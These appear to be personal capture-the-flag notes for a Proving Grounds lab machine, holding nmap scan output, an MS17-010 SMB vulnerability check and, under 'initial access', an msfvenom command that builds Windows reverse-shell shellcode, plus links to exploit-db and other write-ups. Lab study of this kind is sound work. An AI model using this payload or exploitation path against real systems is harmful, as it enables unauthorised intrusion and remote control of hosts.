# nmap
```
┌──(kali㉿kali)-[~/PG/internal]
└─$ nmap -p- --min-rate 10000 192.168.165.40
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 05:59 EST
Warning: 192.168.165.40 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.165.40
Host is up (0.043s latency).
Not shown: 64831 closed tcp ports (reset), 691 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.43 seconds
                                                                                                                                                     
┌──(kali㉿kali)-[~/PG/internal]
└─$ nmap -p 53,135,139,445,3389,5357 -sCV 192.168.165.40                                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 06:00 EST
Nmap scan report for 192.168.165.40
Host is up (0.043s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-01-05T19:52:51
|_Not valid after:  2025-07-07T19:52:51
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2025-02-21T11:00:40+00:00
|_ssl-date: 2025-02-21T11:00:48+00:00; 0s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-21T03:00:40-08:00
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:3c:45 (VMware)
| smb2-time: 
|   date: 2025-02-21T11:00:41
|_  start_date: 2025-02-20T21:30:47
|_clock-skew: mean: 1h36m00s, deviation: 3h34m40s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.82 seconds


┌──(kali㉿kali)-[~/PG/internal]
└─$ sudo nmap -Pn -sU -p- 192.168.165.40 --min-rate 10000 -T5
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 06:04 EST
Warning: 192.168.165.40 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.165.40
Host is up (0.048s latency).
Not shown: 65513 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
53/udp    open   domain
137/udp   open   netbios-ns
778/udp   closed unknown
2818/udp  closed rmlnk
7472/udp  closed unknown
7734/udp  closed smip
8701/udp  closed unknown
10908/udp closed unknown
11866/udp closed unknown
19705/udp closed unknown
21372/udp closed unknown
22916/udp closed unknown
23694/udp closed unknown
25251/udp closed unknown
26269/udp closed unknown
28550/udp closed unknown
39314/udp closed unknown
52270/udp closed unknown
52915/udp closed unknown
54651/udp closed unknown
56824/udp closed unknown
65427/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 19.98 seconds
```
![Pasted image 20250221190118](<0. Attachments/Pasted image 20250221190118.png>)

# smb vuln
```
┌──(kali㉿kali)-[~/PG/internal]
└─$ nmap --script smb-vuln-ms17-010 -p 445 192.168.165.40 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 07:03 EST
Nmap scan report for INTERNAL (192.168.165.40)
Host is up (0.043s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 1.03 seconds
```

![Pasted image 20250221200417](<0. Attachments/Pasted image 20250221200417.png>)

https://www.exploit-db.com/exploits/42031
# initial access
shellcode gen
![Pasted image 20250221201007](<0. Attachments/Pasted image 20250221201007.png>)
```
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f raw EXITFUNC=thread -o reverse.bin
```

# writeups to understand the broken state
[Offensive Security – Proving Grounds – Internal Write-up – No Metasploit – Trenches of IT](https://www.trenchesofit.com/2020/11/24/offensive-security-proving-grounds-internal-write-up-no-metasploit/)
[Proving Grounds Practice — Internal | by Dpsypher | Medium](https://medium.com/@Dpsypher/proving-grounds-practice-internal-e5098dd29793)